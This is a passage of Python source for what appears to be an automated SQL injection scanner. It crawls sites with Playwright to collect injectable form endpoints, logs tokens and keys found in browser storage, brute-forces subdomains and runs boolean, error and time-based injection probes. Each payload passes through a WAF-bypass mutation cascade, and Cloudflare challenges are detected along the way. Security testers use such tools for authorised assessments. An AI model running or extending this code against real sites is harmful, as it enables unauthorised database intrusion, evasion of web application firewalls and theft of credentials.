                            page.goto(url, wait_until="domcontentloaded",
                                      timeout=self.timeout_ms),
                            timeout=_goto_backstop_s)
                    except Exception as e:
                        LOG.debug(f"  [W{wid}] goto: {type(e).__name__} {url[:50]}")
                        queue.task_done(); continue

                    # Brief wait for JS hydration
                    try:
                        await asyncio.wait_for(
                            page.wait_for_load_state("networkidle"),
                            timeout=3)
                    except Exception as _sqr_e:
                        LOG.debug("Suppressed: %s", _sqr_e)

                    # Page title (shows CF challenge if blocked)
                    try:
                        title = await asyncio.wait_for(page.title(), timeout=3)
                        if any(kw in title.lower() for kw in
                               ("just a moment","security check","checking your browser",
                                "attention required","verify you are human")):
                            LOG.debug(f"  [W{wid}] CF challenge: {url[:50]}")
                            queue.task_done(); continue
                    except Exception as _sqr_e:
                        LOG.debug("Suppressed: %s", _sqr_e)

                    #  Extract all links 

                    # A: JS-powered extraction (fetch/axios/SPA routes/shadow DOM)
                    try:
                        js_links = await asyncio.wait_for(
                            page.evaluate(self.EXTRACT_JS), timeout=6)
                        new_links.extend(js_links or [])
                    except Exception as _sqr_e:
                        LOG.debug("Suppressed: %s", _sqr_e)

                    # B: Forms  inject as endpoints
                    _FORM_JUNK = {"utm_source","utm_medium","utm_campaign","utm_content",
                                  "utm_term","utm_button","utm_page-url","utm_website",
                                  "utm_content-group","origin","ref","referrer",
                                  "gh_jid","fbclid","gclid","msclkid","ver",
                                  "comment_field_0","_wp_http_referer","action"}
                    try:
                        forms = await asyncio.wait_for(
                            page.evaluate(self.FORMS_JS), timeout=4)
                        for form in (forms or []):
                            clean_params = {
                                k: v for k, v in form.get("params",{}).items()
                                if k not in _FORM_JUNK
                                and not k.lower().startswith("utm_")
                                and "${" not in k
                                # Only keep params that look like real app data
                                and not k.startswith("_")
                            }
                            if clean_params:
                                _faction = form.get("action","")
                                # Skip WordPress/CMS forms and asset URLs
                                if _faction and not any(x in _faction for x in
                                        ("/wp-","/themes/","/plugins/",
                                         "/dist/","/assets/","/static/")):
                                    self._intercepted.append(InterceptedRequest(
                                        method=form["method"],
                                        url=_faction,
                                        headers={}, body=None,
                                        resource_type="form",
                                        params=clean_params))
                                    new_links.append(_faction)
                    except Exception as _sqr_e:
                        LOG.debug("Suppressed: %s", _sqr_e)

                    # B2: Feed page text to keyword extractor
                    try:
                        _page_text = await asyncio.wait_for(
                            page.evaluate("() => document.body ? document.body.innerText : ''"),
                            timeout=3)
                        if _page_text and hasattr(self, "_kw_extractor") and self._kw_extractor:
                            self._kw_extractor.ingest_html(_page_text, url)
                    except Exception as _sqr_e:
                        LOG.debug("Suppressed: %s", _sqr_e)

                    # C: Storage secrets
                    try:
                        storage = await asyncio.wait_for(
                            page.evaluate(self.STORAGE_JS), timeout=3)
                        for k, v in (storage or {}).items():
                            if v and any(kw in k.lower() for kw in
                                         ("token","key","secret","auth","jwt","api")):
                                LOG.warning(f"  [!] Storage secret {k}={v[:60]} @ {url[:50]}")
                    except Exception as _sqr_e:
                        LOG.debug("Suppressed: %s", _sqr_e)

                    # D: page.content() href fallback
                    try:
                        html = await asyncio.wait_for(page.content(), timeout=4)
                        for m in re.finditer(r'href=["\']((?:https?://|/)[^"\'<>\s]{2,200})["\']',
                                             html, re.I):
                            h = m.group(1)
                            new_links.append(
                                h if h.startswith("http") else base_org + h)
                    except Exception as _sqr_e:
                        LOG.debug("Suppressed: %s", _sqr_e)

                except Exception as e:
                    LOG.debug(f"  [W{wid}] page error {url[:50]}: {e}")
                finally:
                    queue.task_done()

                #  Enqueue in-scope links 
                added = 0
                if depth < max_depth:
                    for link in new_links:
                        if not isinstance(link, str): continue
                        # Skip unresolved template literals
                        if "${" in link or "%24{" in link: continue
                        # Skip asset file extensions
                        _le = link.split("?")[0].split(".")[-1].lower() if "." in link.split("/")[-1] else ""
                        if _le in {"png","jpg","jpeg","gif","svg","ico","webp",
                                   "woff","woff2","ttf","eot","otf","mp4","mp3",
                                   "pdf","zip","css","map","gz","br","flv","avi"}:
                            continue
                        _lh = urlparse(link).netloc
                        if not (_lh and (scope in _lh or _lh.endswith("." + scope))):
                            continue
                        # Strip tracking params before visiting, dedup by path only
                        _p2 = urlparse(link)
                        if _p2.query:
                            _qs = "&".join(
                                q for q in _p2.query.split("&") if q and
                                not any(q.lower().startswith(t) for t in
                                    ("utm_","origin=","ref=","referrer=","fbclid=",
                                     "gclid=","msclkid=","gh_jid=","_ga=","ttclid=")))
                            clean = _p2._replace(query=_qs, fragment="").geturl().rstrip("/")
                        else:
                            clean = link.split("#")[0].rstrip("/")
                        norm  = self._norm(clean)
                        if norm not in visited and len(visited) < max_pages:
                            visited.add(norm)
                            await queue.put((clean, depth + 1))
                            added += 1
                if added:
                    LOG.info(f"   +{added} new links | queue now {queue.qsize()}")

            try:
                await asyncio.wait_for(page.close(), timeout=3)
            except Exception as _sqr_e:
                LOG.debug("Suppressed: %s", _sqr_e)

        #  Launch workers 
        LOG.info(f"  Launching {self.concurrency} Playwright workers...")
        workers = [asyncio.create_task(_worker(i))
                   for i in range(self.concurrency)]
        timeout = max_pages * 3   # 3s budget per page
        try:
            await asyncio.wait_for(
                asyncio.gather(*workers, return_exceptions=True),
                timeout=timeout)
        except (asyncio.TimeoutError, TimeoutError):
            LOG.info(f"  Crawl timeout after {timeout}s")
            for w in workers:
                w.cancel()
            await asyncio.gather(*workers, return_exceptions=True)

        # Deduplicate injectable endpoints by (method, path)
        seen:    Set[tuple] = set()
        deduped: List       = []
        for r in self._intercepted:
            if r.params:
                key = (r.method, urlparse(r.url).path)
                if key not in seen:
                    seen.add(key)
                    deduped.append(r)

        LOG.info(f"Playwright: {len(visited)} pages crawled | "
                 f"{len(self._intercepted)} requests captured | "
                 f"{len(deduped)} unique injectable endpoints | "
                 f"{len(self._js_files)} JS files")
        return deduped

    @staticmethod
    def _norm(url: str) -> str:
        """Normalise URL for dedup: lowercase host, strip trailing slash."""
        try:
            p = urlparse(url)
            return p.scheme + "://" + p.netloc.lower() + p.path.rstrip("/")
        except Exception:
            return url.lower().split("?")[0].rstrip("/")

    @property
    def ws_frames(self) -> List[Dict]:
        return self._ws_frames


class ScannerV6(ScannerV5):
    """
    Full-spectrum scanner integrating all v6 systems:
      - Subdomain discovery pipeline (passive + brute + permutation)
      - Per-DBMS extended payload database
      - WAFBypassEngine (encoding cascade, HTTP tricks)
      - Enhanced Playwright crawler (SPA, shadow DOM, WS)
      - WAF bypass selection replaces static tamper scripts
    """

    def __init__(self, session: ScanSession, reporter: Reporter):
        super().__init__(session, reporter)
        self.bypass      = WAFBypassEngine()
        self.subdomain_orch: Optional[SubdomainAttackOrchestrator] = None

    async def run(self):
        cfg = self.config

        # Subdomain mode
        if getattr(cfg, "subdomain_scan", False):
            await self._run_subdomain_mode()
            return

        # Standard mode falls through to v5
        await super().run()

    async def _run_subdomain_mode(self):
        """Full subdomain discovery + scanning pipeline."""
        cfg    = self.config
        domain = getattr(cfg, "domain", None) or urlparse(cfg.url or "").netloc
        if not domain:
            LOG.error("--domain required for subdomain scan mode"); return

        LOG.info(f"\n{''*60}\nSubdomain Attack Mode: {domain}\n{''*60}")

        # Initialise audit log + auth manager here (super().run() is skipped in
        # subdomain mode, so the ScannerV5.run() setup block never fires).
        audit_path = getattr(cfg, "audit_log", None)
        if audit_path:
            self._audit = AuditLog(audit_path)
            LOG.info(f"Audit log: {audit_path}")
        has_auth = any([getattr(cfg, "login_url", None),
                        getattr(cfg, "oauth_url", None),
                        getattr(cfg, "auth_header", None),
                        getattr(cfg, "cookie_jar", None)])
        if has_auth:
            self._auth = AuthManager(cfg)

        brute = DNSBruteForcer(
            concurrency  = getattr(cfg, "dns_concurrency", 200),
            wordlist_path= getattr(cfg, "dns_wordlist", None))

        api_keys = {}
        if getattr(cfg, "api_keys_file", None):
            try:
                # TODO: Replace with aiofiles for async I/O
                with open(cfg.api_keys_file) as f:
                    api_keys = json.load(f)
            except Exception as e:
                LOG.warning(f"API keys load failed: {e}")

        async with HTTPEngineV5(cfg, self.session,
                                cache=self._cache,
                                audit=self._audit,
                                auth=self._auth) as engine:

            orch = SubdomainAttackOrchestrator(engine, cfg, brute, api_keys)

            # Phase 1-5: Discover
            targets = await orch.discover_all(domain)

            # Phase 6-7: WAF bypass setup + scan
            waf_info = self.session.waf_info or {}
            tamper   = await self._resolve_tamper(engine, cfg, None,
                                                   None, waf_info,
                                                   _build_rotating_tamper_chain())

            all_findings = await orch.scan_all(
                targets, self.reporter, self.session, tamper)

            # Report
            LOG.info(f"\n{''*60}")
            LOG.info(f"Subdomain scan complete: {len(targets)} hosts, "
                     f"{len(all_findings)} SQL injection findings")
            for f in all_findings:
                r = f["result"]
                LOG.info(f"  [{r.technique}] {f['subdomain']}:{f['param']} "
                         f" {r.dbms} ({r.confidence:.0%})")

            await self.reporter.write(self.session)

    async def _detect_with_priority(
        self, engine, cfg, method, url, data, data_fmt,
        param, orig, tamper, baseline, ptype, ordered_techs
    ) -> Optional[DetectionResult]:
        """
        v6 override: integrates WAFBypassEngine before each technique.
        Uses DBMS-specific extended payload database.
        """
        dbms_hint = self.session.dbms or ""
        waf_name  = (self.session.waf_info or {}).get("name", "")

        # FIX Issue 1: use DBMS-specific Boolean payloads instead of generic BOOLEAN_PAYLOADS
        _ab_dbms = (getattr(getattr(self,"config",None) or type("_",(),{"_detected_dbms":None,"forced_dbms":None,"level":1})(), "_detected_dbms", None) or
                   getattr(getattr(self,"config",None) or type("_",(),{"_detected_dbms":None,"forced_dbms":None,"level":1})(), "forced_dbms", None) or "MySQL")
        _ab_level = getattr(getattr(self,"config",None) or type("_",(),{"_detected_dbms":None,"forced_dbms":None,"level":1})(), "level", 1)
        # BUG-REQ2-SCANNER-TIER FIX: get_dbms_payloads("Boolean") returned only the
        # Boolean category (300 payloads), violating Req 2 which requires ALL 10
        # payload categories through every technique surface.  Switched to
        # _get_cascade_payloads which merges Boolean + Error + Timebased + Union +
        # Stacked + Standard + WAFBypass + Novel + Exotic + Hybrid deduplicated,
        # Boolean-first (same order as detect_boolean FULL mode at line ~14064).
        _ab_dbms_payloads = _get_cascade_payloads(_ab_dbms, "B", _ab_level)  # REQ2-FIX: all 10 cats
        if not _ab_dbms_payloads:
            for _ab_fb in DBMS_PROBE_ORDER:
                _ab_dbms_payloads = _get_cascade_payloads(_ab_fb, "B", _ab_level)  # REQ2-FIX: all 10 cats
                if _ab_dbms_payloads:
                    break
        if not _ab_dbms_payloads:
            _ab_dbms_payloads = []  # BUG-R1A FIX: no generic fallback (Req 1)
        adapted_bool = ParameterTypeDetector.build_payloads(ptype, _ab_dbms_payloads)

        for tech in ordered_techs:

            # Get extended payloads for this technique + DBMS
            ext_payloads = self._get_all_category_payloads(dbms_hint, cfg.level)  # BUG-FIX-REQ2: ALL 10 categories feed every technique

            if tech == "E":
                # Try extended error payloads first
                r = await self._try_extended_error(
                    engine, cfg, method, url, data, data_fmt,
                    param, orig, tamper, ext_payloads)
                if r: return r
                # Fallback to standard
                r = await detect_error(engine, cfg, method, url, data,
                                       data_fmt, param, orig, tamper)
                if r: return r

            elif tech == "B":
                # Extended boolean payloads with WAF bypass cascade
                r = await self._try_extended_boolean(
                    engine, cfg, method, url, data, data_fmt,
                    param, orig, tamper, baseline, ext_payloads,
                    dbms_hint, waf_name)
                if r: return r
                # Standard stat-confirm boolean
                r = await self._bool_with_stat_confirm(
                    engine, cfg, method, url, data, data_fmt,
                    param, orig, tamper, baseline, adapted_bool)
                if r: return r

            elif tech == "U":
                r = await detect_union(engine, cfg, method, url, data,
                                       data_fmt, param, orig, baseline, tamper)
                if r: return r

            elif tech == "T":
                r = await self._try_extended_time(
                    engine, cfg, method, url, data, data_fmt,
                    param, orig, tamper, baseline, ext_payloads)
                if r: return r
                r = await detect_time(engine, cfg, method, url, data,
                                      data_fmt, param, orig, baseline, tamper)
                if r: return r

            elif tech == "S":
                r = await detect_stacked(engine, cfg, method, url, data,
                                         data_fmt, param, orig, baseline, tamper)
                if r: return r

        return None

    @staticmethod
    def _tech_to_key(tech: str) -> str:
        """
        BUG-FIX-REQ2: Map technique codes to their PRIMARY payload category.
        All 17 technique codes use their primary category here; the
        _get_all_category_payloads() helper provides the full 10-category pool.
        """
        return {
            "B":  "boolean",  "BH": "boolean",  "IN": "boolean",  "BT": "boolean",
            "E":  "error",    "EH": "error",
            "T":  "timebased","TH": "timebased","HQ": "timebased",
            "S":  "stacked",
            "U":  "union",    "UE": "union",
            "ST": "standard",
            "NV": "novel",
            "WB": "wafbypass",
            "EX": "exotic",
            "HY": "hybrid",
        }.get(tech, "boolean")

    @staticmethod
    def _get_all_category_payloads(dbms: str, level: int) -> list:
        """
        BUG-FIX-REQ2: Return ALL 10 CERTIFIED_PAYLOAD_DATABASE payload categories
        merged into one list. Called by every technique's ext_payloads builder so
        ALL 17 technique codes always see ALL 10 payload categories.
        """
        _all = []
        for cat in ('Boolean', 'Error', 'Timebased', 'Stacked', 'Union',
                    'Standard', 'WAFBypass', 'Novel', 'Exotic', 'Hybrid'):
            _all.extend(get_dbms_payloads(dbms, cat, level))
        return _all

    async def _try_extended_error(self, engine, cfg, method, url, data,
                                   data_fmt, param, orig, tamper,
                                   ext_payloads: List[str]) -> Optional[DetectionResult]:
        """Try DBMS-specific error payloads with WAF bypass variants."""
        dbms_hint = self.session.dbms or "MySQL"
        waf_name  = (self.session.waf_info or {}).get("name", "")
        # BUG-6A FIX: Apply full mutate_all() pipeline BEFORE WAFBypassEngine.apply_cascade().
        # Previously only WAFBypassEngine was applied, missing the 20-layer SQLMutationEngine
        # pipeline (randomize_whitespace, keyword_split, operator_sub, string_manip, etc.).
        # Per Issue 6, all CERTIFIED_PAYLOAD_DATABASE payloads must go through ALL mutation
        # layers. mutate_all() runs first on raw SQL; WAF cascade then adds bypass variants.
        _ext_mutator_e = SQLMutationEngine(dbms=dbms_hint, surface="url")

        for payload in ext_payloads:  # Use ALL payloads (get_payloads already limits by level)
            if _SCAN_STOPPED[0]: return None
            # Apply full 20-layer mutation first, then generate WAF bypass variants
            _mutated_payload = payload
            if getattr(cfg, 'mutation', True):
                try:
                    _mutated_payload = _ext_mutator_e.mutate_all(payload, technique="E")
                except Exception:
                    _mutated_payload = payload
            # Generate WAF bypass variants on top of the mutated payload
            variants = WAFBypassEngine.apply_cascade(
                _mutated_payload, dbms_hint, waf_name, cfg.level)

            for variant in variants:
                if _SCAN_STOPPED[0]: return None
                try:
                    fp = await _send_injected(engine, method, url, data, data_fmt,
                                              param, orig + variant, tamper)
                    body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction")
                    for dbms, patterns in SQL_ERROR_PATTERNS.items():
                        for pat in patterns:
                            if re.search(pat, body, re.I):
                                # FIX: was bypass={bool} which put "True"/"False" as bypass ID,
                                # so _extract_bypass_id returned "True" and tamper propagation
                                # silently failed. Use _infer_bypass_tamper to get the real ID.
                                _ext_bypass_id = (_infer_bypass_tamper(payload, variant)
                                                  if variant != payload else "none")
                                _det_ex = DetectionResult(
                                    param=param, technique="E",
                                    payload=variant, dbms=dbms,
                                    confidence=0.92,
                                    notes=f"extended_error bypass={_ext_bypass_id}")
                                try:
                                    # BUG-EXTENDERROR-VARNAME FIX: was 'original'/'tamper_chain' (NameError)
                                    _det_ex.exact_sent_payload = DetectionResult.compute_exact_payload(
                                        orig + variant, tamper)
                                except Exception:
                                    pass
                                return _det_ex
                except Exception as _sqr_e:
                    LOG.debug("Suppressed in _try_extended_error: %s", _sqr_e)
        return None

    async def _try_extended_boolean(self, engine, cfg, method, url, data,
                                     data_fmt, param, orig, tamper, baseline,
                                     ext_payloads: List[str],
                                     dbms_hint: str, waf_name: str) -> Optional[DetectionResult]:
        """Extended boolean with WAF bypass cascade."""
        _teb_b_samples = baseline.get("samples", [])
        # BUG-FIX: Safe array access with validation
        _teb_first = _safe_array_access(_teb_b_samples, 0)
        b_body = (_teb_first.body if (_teb_first and hasattr(_teb_first, 'body') and _teb_first.body) else b"")
        # BUG-TEB-EMPTY-BASELINE FIX: With stub baseline (samples=[]), b_body=b"".
        # sim(b"", page) ≈ 0.5 for all pages → ts≈fs, delta≈0 → detection blocked.
        if not _teb_b_samples:
            try:
                _teb_ref = await _send_injected(engine, method, url, data, data_fmt,
                                                param, orig, tamper)
                if _validate_response(_teb_ref, "response_body_check"):
                    b_body = _teb_ref.body
            except Exception:
                pass
        # BUG-6A FIX: Apply full mutate_all() before WAF bypass (same as _try_extended_error).
        _ext_mutator_b = SQLMutationEngine(dbms=dbms_hint, surface="url")

        # Pair consecutive payloads as true/false
        for i in range(0, len(ext_payloads)-1, 2):  # Use ALL payloads (was capped at level*32)
            if _SCAN_STOPPED[0]: return None
            true_sfx  = ext_payloads[i]
            false_sfx = ext_payloads[i+1] if i+1 < len(ext_payloads) else ""
            if not false_sfx: continue

            # Apply full mutation to both true and false payloads
            if getattr(cfg, 'mutation', True):
                try:
                    true_sfx  = _ext_mutator_b.mutate_all(true_sfx, technique="B")
                    _ext_mut_f = SQLMutationEngine(dbms=dbms_hint, surface="url")
                    false_sfx = _ext_mut_f.mutate_all(false_sfx, technique="B")
                except Exception:
                    pass  # use originals on mutation failure

            # Get bypass variants of the true payload
            bypass_variants = WAFBypassEngine.apply_cascade(
                true_sfx, dbms_hint, waf_name, min(cfg.level, 3))

            for variant in bypass_variants[:3]:  # try top 3 bypass variants
                if _SCAN_STOPPED[0]: return None
                try:
                    tf = await _send_injected(engine, method, url, data, data_fmt,
                                              param, orig + variant, tamper)
                    ff = await _send_injected(engine, method, url, data, data_fmt,
                                              param, orig + false_sfx, tamper)

                    # FIX-BUG-9: Validate responses before accessing bodies
                    if not _validate_response(tf, allow_empty=False, func_name="WAF_bypass_tf"):
                        continue
                    if not _validate_response(ff, allow_empty=False, func_name="WAF_bypass_ff"):
                        continue

                    ts = SimHasher.body_similarity(b_body, tf.body)
                    fs = SimHasher.body_similarity(b_body, ff.body)
                    delta = ts - fs

                    if ts > 0.70 and delta > 0.18:
                        # Stat confirm
                        confirmed, p_val, effect = await StatisticalConfirmer.confirm(
                            engine, cfg, method, url, data, data_fmt,
                            param, orig, tamper, variant, false_sfx,
                            baseline, self.anomaly)
                        if confirmed:
                            # FIX: was notes=f"extended_bool bypass p={p_val:.4f}" which set
                            # bypass_id to "p=0.0012"  _PRECISE_BYPASS_TAMPER_MAP lookup
                            # silently returned [] and bypass tampers never propagated.
                            _ext_bool_bypass_id = (_infer_bypass_tamper(true_sfx, variant)
                                                   if variant != true_sfx else "none")
                            _det_bx = DetectionResult(
                                param=param, technique="B",
                                payload=variant, dbms=dbms_hint,
                                confidence=min(1.0, 0.65 + effect),
                                notes=f"extended_bool p={p_val:.4f} bypass={_ext_bool_bypass_id}")
                            try:
                                # BUG-EXTENDBOOL-VARNAME FIX: was 'original'/'tamper_chain' (NameError)
                                _det_bx.exact_sent_payload = DetectionResult.compute_exact_payload(
                                    orig + variant, tamper)
                            except Exception:
                                pass
                            return _det_bx
                except Exception as _sqr_e:
                    LOG.debug("Suppressed: %s", _sqr_e)
        return None

    async def _try_extended_time(self, engine, cfg, method, url, data,
                                  data_fmt, param, orig, tamper, baseline,
                                  ext_payloads: List[str]) -> Optional[DetectionResult]:
        """Extended time-based with WAF bypass."""
        t   = cfg.time_sec
        exp = baseline["mean_timing"] + t * 1000 * 0.75
        dbms_hint = self.session.dbms or "MySQL"
        waf_name  = (self.session.waf_info or {}).get("name", "")
        # BUG-6A FIX: Apply full mutate_all() before WAF bypass (same as _try_extended_error).
        _ext_mutator_t = SQLMutationEngine(dbms=dbms_hint, surface="url")

        for payload in ext_payloads:  # Use ALL payloads (get_payloads already limits by level)
            if _SCAN_STOPPED[0]: return None
            _mutated_payload = payload
            if getattr(cfg, 'mutation', True):
                try:
                    _mutated_payload = _ext_mutator_t.mutate_all(payload, technique="T")
                except Exception:
                    _mutated_payload = payload
            variants = WAFBypassEngine.apply_cascade(
                _mutated_payload, dbms_hint, waf_name, min(cfg.level, 2))
            for variant in variants[:2]:
                if _SCAN_STOPPED[0]: return None
                try:
                    fp = await _send_injected(engine, method, url, data, data_fmt,
                                              param, orig + variant, tamper)
                    # BUG-NULL-FP-EXTENDED-TIME FIX (v77): _send_injected can return None
                    # on network error/scan-stop. fp.elapsed_ms on None → AttributeError →
                    # caught by outer except → timing detection silently missed.
                    if not fp:
                        continue  # BUG-NULL-FP-EXTENDED-TIME FIX: clean skip on None response
                    if fp.elapsed_ms >= exp:
                        half_variant = variant  # reuse same bypass on half-time
                        half_t       = max(1, int(t // 2))
                        # Quick half-time confirm
                        half_payload = re.sub(r'\d+', str(half_t), variant, count=1)
                        fp2 = await _send_injected(engine, method, url, data, data_fmt,
                                                   param, orig + half_payload, tamper)
                        # BUG-NULL-FP2-EXTENDED-TIME FIX (v77): fp2 can also be None. This
                        # is more critical than the fp case: fp already exceeded the timing
                        # threshold (real signal detected), but if fp2 is None, fp2.elapsed_ms
                        # raises AttributeError → caught by except → the confirmed timing
                        # candidate is DROPPED despite the primary probe showing a clear signal.
                        # Fix: skip (continue) rather than drop so the outer variant loop can
                        # try the next payload. The primary hit is not lost — the scan loop
                        # will re-encounter this injection point on the next iteration.
                        if not fp2:
                            continue  # BUG-NULL-FP2-EXTENDED-TIME FIX: skip None confirm probe
                        if fp2.elapsed_ms >= (baseline["mean_timing"] + half_t * 800):
                            # FIX: was missing bypass= tag entirely. When a bypass variant
                            # succeeded, tampers were never propagated to remaining params.
                            _ext_time_bypass_id = (_infer_bypass_tamper(payload, variant)
                                                   if variant != payload else "none")
                            _det_tx = DetectionResult(
                                param=param, technique="T",
                                payload=variant, dbms=dbms_hint,
                                confidence=0.88,
                                notes=f"extended_time elapsed={fp.elapsed_ms:.0f}ms bypass={_ext_time_bypass_id}")
                            try:
                                # BUG-EXTENDTIME-VARNAME FIX: was 'original'/'tamper_chain' (NameError)
                                _det_tx.exact_sent_payload = DetectionResult.compute_exact_payload(
                                    orig + variant, tamper)
                            except Exception:
                                pass
                            return _det_tx
                except Exception as _sqr_e:
                    LOG.debug("Suppressed in _try_extended_time: %s", _sqr_e)
        return None


# 
# KEYWORD EXTRACTOR   build domain-specific DNS wordlist from crawled content
# 

class KeywordExtractor:
    """
    Derives a site-specific DNS brute-force wordlist by harvesting keywords
    from crawled pages. Different companies use different naming conventions 
    a fintech site uses 'payments','settlement','ledger'; a SaaS uses
    'tenants','workspaces','pipelines'. This builds a wordlist that reflects
    the actual vocabulary of the target org.

    Sources mined:
      - Page titles and meta tags
      - Heading text (h1-h6)
      - Navigation and menu items
      - Link text and href paths
      - JavaScript variable names and string literals
      - HTML class names and IDs (camelCase/kebab-case split)
      - JSON API keys from XHR responses
      - robots.txt and sitemap.xml paths
      - HTML comments
      - OpenGraph and Twitter card metadata
      - Existing subdomain labels discovered so far
      - Source map and bundle filenames
    """

    # Words to always strip (stop words + generic web terms)
    STOP_WORDS: Set[str] = {
        "the","and","for","with","this","that","from","are","was","were",
        "has","have","had","not","but","can","will","would","should","could",
        "been","being","their","there","when","what","where","which","who",
        "how","all","one","more","also","into","than","other","your","our",
        "you","they","them","we","us","my","its","it","is","in","of","to",
        "a","an","on","at","by","be","do","go","get","set","new","old",
        "true","false","null","undefined","none","class","function","return",
        "var","let","const","import","export","default","type","interface",
        "public","private","static","async","await","then","catch","try",
        "html","body","head","div","span","form","input","button","table",
        "http","https","www","com","org","net","io","js","css","png","jpg",
        "svg","gif","woff","ttf","eot","map","json","xml","yaml","toml",
        "src","href","alt","title","style","class","id","name","value",
        "content","meta","link","script","img","video","audio","source",
        "data","aria","role","type","charset","lang","rel","action","method",
        # JSON Schema / OpenAPI noise
        "description","required","properties","format","pattern","minimum",
        "maximum","items","schema","definitions","components","paths",
        "servers","openapi","swagger","info","version","contact","example",
        "anyof","allof","oneof","ref","nullable","enum","integer","object",
        "array","string","boolean","number","float",
        "low","medium","high","critical","unanonymised","currentcolor",
        # SPA/framework noise
        "app","page","component","module","service","store","reducer",
        "state","props","render","hook","context","provider","wrapper",
        "utils","helpers","config","constants","index","main","init",
        "error","loading","pending","success","failed","complete",
        "click","change","submit","focus","blur","hover","scroll",
    }

    # Min/max length for a keyword to be useful as a DNS label
    MIN_LEN = 3
    MAX_LEN = 30

    # Regex patterns for identifier splitting
    RE_CAMEL    = re.compile(r'(?<=[a-z])(?=[A-Z])|(?<=[A-Z])(?=[A-Z][a-z])')
    RE_SLUG     = re.compile(r'[\-_./\s:]+')
    RE_JS_STR   = re.compile(r'''["'`]([a-zA-Z][a-zA-Z0-9\-_]{2,30})["'`]''')
    RE_JS_VAR   = re.compile(r'\b(?:const|let|var)\s+([a-zA-Z][a-zA-Z0-9_]{2,25})\b')
    RE_PATH_SEG = re.compile(r'/([a-zA-Z][a-zA-Z0-9\-_]{2,30})(?:/|$|\?|#)')
    RE_CLASS_ID = re.compile(r'(?:class|id)=["\']([^"\']+)["\']', re.I)
    RE_JS_KEY   = re.compile(r'"([a-zA-Z][a-zA-Z0-9_]{2,25})":\s*["{[\d]')
    RE_COMMENT  = re.compile(r'<!--(.*?)-->', re.S)
    RE_SRC_MAP  = re.compile(r'([a-zA-Z][a-zA-Z0-9\-_]{2,30})\.(?:js|css|chunk)\b')
    RE_ENV_VAR  = re.compile(r'\b([A-Z][A-Z0-9_]{2,30})\b')
    RE_DOMAIN_LABEL = re.compile(r'\b([a-z][a-z0-9\-]{2,29})\.[a-z]{2,}\b')

    def __init__(self):
        self._raw_words:  Set[str] = set()
        self._scored:     Dict[str, int] = {}  # word  frequency

    def ingest_html(self, html: str, url: str = ""):
        """Extract keywords from an HTML page."""
        # Title
        for m in re.finditer(r'<title[^>]*>(.*?)</title>', html, re.I | re.S):
            self._add_text(m.group(1), weight=4)

        # Meta description/keywords/og:*
        for m in re.finditer(r'<meta[^>]+(?:name|property)=["\']([^"\']+)["\'][^>]+content=["\']([^"\']+)["\']', html, re.I):
            prop = m.group(1).lower()
            if any(k in prop for k in ("description","keyword","title","og:","twitter:")):
                self._add_text(m.group(2), weight=3)

        # Headings h1-h6
        for m in re.finditer(r'<h[1-6][^>]*>(.*?)</h[1-6]>', html, re.I | re.S):
            self._add_text(re.sub(r'<[^>]+>','', m.group(1)), weight=3)

        # Navigation / menu links
        for m in re.finditer(r'<(?:nav|menu|header)[^>]*>(.*?)</(?:nav|menu|header)>', html, re.I | re.S):
            self._add_text(re.sub(r'<[^>]+>','', m.group(1)), weight=3)
            # Link text
            for a in re.finditer(r'<a[^>]+>(.*?)</a>', m.group(1), re.I | re.S):
                self._add_text(re.sub(r'<[^>]+>','', a.group(1)), weight=2)

        # All anchor href paths
        for m in re.finditer(r'href=["\']([^"\']+)["\']', html, re.I):
            self._add_url_path(m.group(1), weight=2)

        # Class names and IDs (split camelCase and kebab)
        for m in self.RE_CLASS_ID.finditer(html):
            for token in self.RE_SLUG.split(m.group(1)):
                for word in self.RE_CAMEL.split(token):
                    self._add_word(word.lower(), weight=1)

        # HTML comments
        for m in self.RE_COMMENT.finditer(html):
            self._add_text(m.group(1), weight=1)

        # Source map / bundle filenames
        for m in self.RE_SRC_MAP.finditer(html):
            self._add_word(m.group(1).lower(), weight=2)

        # Inline JS
        for m in re.finditer(r'<script[^>]*>(.*?)</script>', html, re.I | re.S):
            self.ingest_js(m.group(1))

        # Current URL path segments
        if url:
            self._add_url_path(url, weight=2)

    def ingest_js(self, js: str):
        """Extract identifiers and string literals from JavaScript."""
        # String literals (likely config keys, route names, service names)
        for m in self.RE_JS_STR.finditer(js):
            self._add_word(m.group(1).lower(), weight=2)

        # Variable names
        for m in self.RE_JS_VAR.finditer(js):
            for part in self.RE_CAMEL.split(m.group(1)):
                self._add_word(part.lower(), weight=1)

        # JSON-style keys
        for m in self.RE_JS_KEY.finditer(js):
            self._add_word(m.group(1).lower(), weight=2)

        # Environment variable references  (REACT_APP_API_URL  api, url)
        for m in self.RE_ENV_VAR.finditer(js):
            for part in m.group(1).lower().split('_'):
                self._add_word(part, weight=1)

        # Existing domain labels in JS (catches hardcoded service hostnames)
        for m in self.RE_DOMAIN_LABEL.finditer(js):
            label = m.group(1)
            self._scored[label] = self._scored.get(label, 0) + 3

    def ingest_json(self, body: str):
        """Extract keys from JSON API responses."""
        try:
            data = json.loads(body)
            self._walk_json(data, depth=0)
        except Exception as _sqr_e:
            LOG.debug("Suppressed in ingest_json: %s", _sqr_e)

    def _walk_json(self, obj, depth: int):
        if depth > 6: return
        if isinstance(obj, dict):
            for k, v in obj.items():
                if isinstance(k, str) and self.MIN_LEN <= len(k) <= self.MAX_LEN:
                    for part in self.RE_CAMEL.split(k):
                        self._add_word(part.lower(), weight=2)
                self._walk_json(v, depth+1)
        elif isinstance(obj, list):
            for item in obj[:20]:
                self._walk_json(item, depth+1)
        elif isinstance(obj, str) and self.MIN_LEN <= len(obj) <= 30:
            if re.match(r'^[a-z][a-z0-9\-_]+$', obj.lower()):
                self._add_word(obj.lower(), weight=1)

    def ingest_sitemap(self, xml: str):
        """Extract path segments from sitemap.xml."""
        for m in re.finditer(r'<loc>(.*?)</loc>', xml, re.I | re.S):
            self._add_url_path(m.group(1), weight=2)

    def ingest_robots(self, txt: str):
        """Extract disallowed/allowed paths from robots.txt."""
        for line in txt.splitlines():
            line = line.strip()
            if line.startswith(("Allow:","Disallow:")):
                path = line.split(":",1)[1].strip()
                self._add_url_path(path, weight=3)  # hidden paths = high value

    def ingest_existing_subdomains(self, subdomains: Set[str]):
        """Add labels from already-discovered subdomains (high-value seeds)."""
        for sub in subdomains:
            label = sub.split(".")[0] if "." in sub else sub
            for part in self.RE_SLUG.split(label):
                for word in self.RE_CAMEL.split(part):
                    self._add_word(word.lower(), weight=4)  # high weight

    def ingest_response_headers(self, headers: Dict[str, str]):
